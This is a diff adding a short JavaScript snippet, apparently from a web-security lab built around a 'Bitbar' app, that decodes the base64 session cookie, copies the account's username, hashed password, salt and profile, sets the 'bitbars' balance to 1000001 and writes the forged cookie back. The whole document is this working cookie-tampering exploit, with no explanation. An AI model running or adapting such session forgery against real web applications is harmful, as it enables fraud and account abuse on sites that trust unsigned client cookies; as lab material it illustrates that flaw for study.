@@ -1,0 +1,15 @@
+const currCookie = JSON.parse(atob(document.cookie.substr(8)));
+
+const newCookie = {
+  "loggedIn": true,
+  "account": {
+    "username": currCookie.account.username,
+    "hashedPassword": currCookie.account.hashedPassword,
+    "salt": currCookie.account.salt,
+    "profile": currCookie.account.profile,
+    "bitbars": 1000001
+  }
+}
+
+const newCookieString = "session=" + btoa(JSON.stringify(newCookie));
+document.cookie = newCookieString;
